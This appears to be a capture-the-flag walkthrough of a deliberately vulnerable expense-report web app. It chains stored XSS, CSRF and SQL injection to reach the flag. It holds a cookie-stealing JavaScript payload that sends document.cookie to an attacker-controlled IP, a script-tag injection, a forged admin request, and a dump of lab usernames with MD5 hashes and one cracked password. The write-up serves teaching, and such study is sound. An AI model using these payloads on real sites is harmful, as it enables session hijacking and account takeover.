______
- We use **http-enum** and find a route where we can create a user. After creating an account, we notice it gets marked as invalid, which suggests that **someone is actively reviewing new users**. To confirm this behavior, we move to a **JavaScript-based HTTP request** approach.

    First, we need a way to **receive data from the victim**, so we start a simple HTTP server on our attacker machine:

```
python3 -m http.server
```

- Then we prepare a script to **steal the session cookie**:

```
var url = new XMLHttpRequest();  
url.open("GET", "http://192.168.1.50/?cookie=" + document.cookie)  
url.send()
```

- And we inject it using:

```
<script src="http://192.168.1.50/exploit.js"></script>
```

- Once this is executed, we successfully capture the cookie of the user who is reviewing the accounts:

```
e7n3c39ul5au75m9uk5il7rqm4 
```

- At this point, the idea would normally be to reuse the cookie, but we hit a restriction:  
    this application only allows **one active login per session**, so replaying the cookie directly is not possible.

- Instead of using the cookie manually, we **abuse the victim’s session indirectly** by modifying our script so that **the admin keeps performing actions for us** which is known as CSRF (Cross site request forgery):

```
var request = new XMLHttpRequest();  
request.open('GET', 'http://192.168.1.12/admin/admin.php?id=11&status=active');  
request.send();
```

- This effectively turns the admin into our execution vector. When they load our payload, their browser sends the request with their privileges, allowing us to **activate our account**.

- After that, we discover a **message panel**, which becomes another attack surface.  Using the same HTTP server technique, we inject a payload to **steal session cookies from any user who views the message**.

<img width="2465" height="549" alt="Captura de pantalla 2025-09-11 040126" src="https://github.com/user-attachments/assets/6d71a954-b993-4fef-bd57-d69bc06bfc2c" />

    We start collecting multiple session cookies and then **test them one by one** until we identify the one belonging to the **manager**.

<img width="2605" height="1042" alt="Captura de pantalla 2025-09-11 040240" src="https://github.com/user-attachments/assets/b5be615b-cd01-45ac-a62d-789029cb0155" />

     And we obtaine access as our manager

- Once we get access at that level, we approve our request. However, to escalate further (finance role), we cannot rely on cookies anymore, so we look for another vector.

     At this point, we discover the application is vulnerable to **MySQL injection**.

<img width="2537" height="1077" alt="Captura de pantalla 2025-09-11 171728" src="https://github.com/user-attachments/assets/ec7e665f-4737-4572-91ae-85d202e4acbd" />


- We enumerate the databases:

```
information_schema  
myexpense  
mysql  
performance_schema
```

- Then enumerate tables:

```
expense  
message  
site  
user
```

- And extract columns from the **user** table:

```
user_id  
username  
password  
role  
lastname  
firstname  
site_id  
mail  
manager_id  
last_connection  
active
```

- Columns

```
1 (user_id)
1 (username)
1 (password)
1 (role)
1 (lastname)
1 (firstname)
1 (site_id)
1 (mail)
1 (manager_id)
1 (last_connection)
1 (active)
```

- Credentials

```
   1   │ afoulon:124922b5d61dd31177ec83719ef8110a
   2   │ pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a
   3   │ rlefrancois:ef0dafa5f531b54bf1f09592df1cd110
   4   │ mriviere:d0eeb03c6cc5f98a3ca293c1cbf073fc
   5   │ mnguyen:f7111a83d50584e3f91d85c3db710708
   6   │ pgervais:2ba907839d9b2d94be46aa27cec150e5
   7   │ placombe:04d1634c2bfffa62386da699bb79f191
   8   │ triou:6c26031f0e0859a5716a27d2902585c7
   9   │ broy:b2d2e1b2e6f4e3d5fe0ae80898f5db27
  10   │ brenaud:2204079caddd265cedb20d661e35ddc9
  11   │ slamotte:21989af1d818ad73741dfdbef642b28f
  12   │ nthomas:a085d095e552db5d0ea9c455b4e99a30
  13   │ vhoffmann:ba79ca77fe7b216c3e32b37824a20ef3
  14   │ rmasson:ebfc0985501fee33b9ff2f2734011882
  15   │ pepe:5e783f68bbe280088d77a82cbd235a0d
  16   │ maria:76eb1cfbe718656c4e028d05e456db5d
  17   │ laura:1f64743aa9fd6cecac9a434f013c16db
  18   │ andres:8ab2b393f039807dc8ace6fdd2c52b5d
  19   │ pedro:6817a8c319cb881e2e53372baf40320c
  Ahora teniendo todas las credenciales hay que buscar el de el encargado de las finanzas (Paul Baudouin)
```

- Dumping credentials gives us:

```
`pbaudouin:64202ddd5fdea4cc5c2f856efef36e1a`
```

- The hashes are in **MD5**, so we crack them:

```
64202ddd5fdea4cc5c2f856efef36e1a → HackMe
```

- With this, we log in as **pbaudouin** (finance role) and approve the transaction.


<img width="2630" height="280" alt="Captura de pantalla 2025-09-11 195959" src="https://github.com/user-attachments/assets/5603283c-1a24-4945-8792-3920bd4a46b9" />


- Finally, logging in as **slamotte** gives us the flag.

---

## Key points

### 1
This is a clear example of **chaining vulnerabilities in a real scenario**:

- **XSS** → steal cookies
- **CSRF** → force admin actions
- **SQL Injection** → extract credentials

The real value is understanding how these vulnerabilities **connect into a full attack path**, not just using them individually.

### 2
In real audits, you cannot assume tools like **curl** or **wget** are available, so you must rely on what the environment gives you.

- **Invisible execution:** JavaScript runs in the victim’s browser using their session.
- **Human factor:** The admin reviewing users/messages becomes the trigger for the attack.
    

This is exactly how real-world attacks work: not just exploiting systems, but **leveraging user behavior**.
